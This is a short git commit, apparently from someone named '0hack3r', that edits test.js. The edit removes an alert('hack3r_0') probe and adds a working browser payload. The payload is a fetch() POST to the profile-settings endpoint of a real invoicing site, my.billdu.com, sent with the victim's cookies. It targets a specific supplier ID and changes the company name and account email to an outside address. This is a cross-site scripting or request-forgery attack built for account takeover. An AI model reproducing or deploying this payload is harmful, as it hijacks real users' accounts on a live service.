b88f5c4db939dd5a968df519faa96ea1e606ba0e
0hack3r <155529279+0hack3r@users.noreply.github.com>
2024-11-13 08:39:22 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,8 @@
-alert('hack3r_0')
+fetch("https://my.billdu.com/accountant.settings/profile?supplierId=1448763", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "save=Save&company=testing&email=bonenes831%40gianes.com&_do=settingsForm-submit",
+  credentials: "include"
+});
